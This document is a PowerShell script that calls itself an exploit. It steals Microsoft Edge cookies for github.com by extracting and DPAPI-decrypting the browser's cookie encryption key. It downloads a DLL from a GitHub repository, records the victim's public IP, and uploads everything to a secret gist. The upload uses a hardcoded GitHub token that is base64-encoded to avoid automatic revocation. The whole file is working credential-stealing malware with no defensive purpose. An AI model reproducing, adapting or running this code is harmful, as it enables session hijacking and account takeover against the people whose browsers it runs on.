# This exploit create a secret gist containing the cookie file of microsoft edge
# the encryption key to decrypt the cookies value
# the ip address of the victim.

# UPDATE the following variables 
$decodedBytes = [System.Convert]::FromBase64String("Z2hwX3laTUJUZWhQZjY2aFdTcTJDZTRWQ2ZzM0Y4YjZqejRTZzRDOQ==") # the token only need gists and repos permission and need to be encoded in base64 to prevent github to automatically destroy it !
$repo = "zerodaycorp/psychic-doodle" # the repo which contains the System.Data.SQLite.dll

# Convert the decoded bytes to a string
$token = [System.Text.Encoding]::UTF8.GetString($decodedBytes)



Remove-Item -Path ".\System.Data.SQLite.dll" # just in case we run it multiple times

$response = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/$repo/patch-1/System.Data.SQLite.dll" -Method Get -OutFile ".\System.Data.SQLite.dll"

# Extract the encryption key

Add-Type -Assembly System.Security
$localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$jsondata = Get-Content -Raw -Path $localStatePath | ConvertFrom-Json
$encKey = [System.Convert]::FromBase64String($jsondata.os_crypt.encrypted_key.ToString());
$encKey= $encKey[5..$encKey.Length];
$decryptedKey = [Security.Cryptography.ProtectedData]::Unprotect($enckey,$null, [Security.Cryptography.DataProtectionScope]::CurrentUser)


# Load the SQLite assembly
Add-Type -Path ".\System.Data.SQLite.dll"

# Open the SQLite connection
$cookiesPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$connectionString = "Data Source=$cookiesPath"
$connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList $connectionString
$connection.Open()

# Extract the data from the cookie partially decrypted since powershell 5 does not support Security.Cryptograhphy.AesGcm
# we will finish to decrypt the data on the attacker side...
$query = "SELECT name, host_key, encrypted_value FROM cookies WHERE host_key = 'github.com' OR host_key = '.github.com'"
$command = $connection.CreateCommand()
$command.CommandText = $query

$reader = $command.ExecuteReader()
$cookieData = ""
while ($reader.Read()) {
    $row = New-Object psobject
    for ($i = 0; $i -lt $reader.FieldCount; $i++) {
        $row | Add-Member -MemberType NoteProperty -Name $reader.GetName($i) -Value $reader.GetValue($i)
    }
    $encryptedData = $row.encrypted_value
    [byte[]]$nonce = $encryptedData[3..14]
    [byte[]]$ciphertext = $encryptedData[15..($encryptedData.Length-1-16)]
    [byte[]]$tag = $encryptedData[($encryptedData.Length-16)..($encryptedData.Length-1)]
    $cookieData = $cookieData + '{0}, {1}, {2}, {3}, {4}, {5}' -f $row.host_key, $row.name, [Convert]::ToBase64String($decryptedKey), [Convert]::ToBase64String($ciphertext), [Convert]::ToBase64String($nonce), [Convert]::ToBase64String($tag) + "`n"
}

$connection.Close()


# Get the public IP address of the victim
$publicIpAddress = Invoke-RestMethod -Uri 'http://api.ipify.org'


# Create a secret Gist containing all the information
$headers = @{
    "Authorization" = "token $token"
}

$body = @{
    description = ""
    public = $false
    files = @{
        "victim.txt" = @{
            content = "IP: " + $publicIpAddress + "`n" + "Cookies: " + "`n" + $cookieData
        }
    }
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "https://api.github.com/gists" -Body $body -Headers $headers
